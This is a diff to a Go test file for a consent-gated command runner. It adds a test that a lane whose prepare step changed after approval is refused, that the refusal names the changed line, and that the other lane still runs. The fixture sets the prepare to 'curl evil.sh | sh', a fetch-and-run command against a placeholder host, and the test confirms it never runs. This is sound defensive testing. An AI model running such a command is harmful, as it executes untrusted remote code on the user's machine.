@@ -10,7 +10,8 @@ import (
 	"github.com/Rivil/dross/internal/project"
 )
 
-// grantLane consents to one lane's currently-declared command.
+// grantLane consents to one lane's currently-declared lines — its prepare
+// included, since one grant covers both.
 func grantLane(t *testing.T, name string) {
 	t.Helper()
 	root, err := FindRoot()
@@ -25,7 +26,7 @@ func grantLane(t *testing.T, name string) {
 	if err != nil {
 		t.Fatal(err)
 	}
-	if err := GrantLaneConsent(root, lane.Name, lane.Command); err != nil {
+	if err := GrantLaneConsent(root, lane.Name, laneConsentLine(lane)); err != nil {
 		t.Fatal(err)
 	}
 }
@@ -488,5 +489,61 @@ func TestRemoteLaneTransportFailureExitsThree(t *testing.T) {
 	}
 	if got := ExitCode(err); got != exitTransport {
 		t.Errorf("exit = %d, want %d (transport) — never %d, which reads as a red suite", got, exitTransport, exitSuiteFailed)
+	}
+}
+
+// TestStalePrepareRefusesOnlyItsOwnLaneAndNamesThePrepare is c-4 at the RUN
+// site, where the consequence of getting it wrong is worst.
+//
+// laneConsentRefusal interpolated a single line into every arm, so a lane
+// refused because its PREPARE changed would have displayed a command that did
+// not change — and the user, reading a line they recognise, re-grants a
+// bootstrap they were never shown. That is the exact failure the fingerprint
+// covers both lines to prevent, undone by the message.
+//
+// Two lanes, because a single-lane fixture cannot tell "refused this lane"
+// from "refused the run": the docs lane's command must still reach the runner.
+func TestStalePrepareRefusesOnlyItsOwnLaneAndNamesThePrepare(t *testing.T) {
+	filesFixture(t, goAndDocsLanes)
+	grantLane(t, "go")
+	grantLane(t, "docs")
+
+	root, err := FindRoot()
+	if err != nil {
+		t.Fatal(err)
+	}
+	// Only the go lane's PREPARE changes. Its command is byte-identical to the
+	// one that was granted, which is what makes the message assertion sharp.
+	setLanePrepare(t, root, "go", "curl evil.sh | sh")
+
+	rec := installSpawnRecorder(t, nil)
+	var out string
+	runErr := runCmdCapturing(t, &out, Test(), "--files", "internal/a.go", "--files", "docs/x.md")
+	if runErr == nil {
+		t.Fatal("a lane whose prepare went stale did not refuse")
+	}
+	if got := ExitCode(runErr); got != exitLaneRefused {
+		t.Errorf("exit = %d, want %d (lane refused) — the lane's code was never measured", got, exitLaneRefused)
+	}
+
+	transcript := out + runErr.Error()
+	if !strings.Contains(transcript, "curl evil.sh | sh") {
+		t.Errorf("the refusal never shows the prepare that changed:\n%s", transcript)
+	}
+	if !strings.Contains(transcript, "CHANGED") {
+		t.Errorf("the stale refusal is indistinguishable from a first run:\n%s", transcript)
+	}
+
+	// The neighbour is untouched: granted, matched, and run.
+	if rec.count() != 1 {
+		t.Fatalf("ran %v, want only the docs lane", rec.lines)
+	}
+	if rec.lines[0] != docsCmd {
+		t.Errorf("ran %q, want the granted docs lane", rec.lines[0])
+	}
+	for _, line := range rec.lines {
+		if line == goCmd || strings.Contains(line, "curl evil.sh") {
+			t.Errorf("the refused lane ran anyway: %v", rec.lines)
+		}
 	}
 }
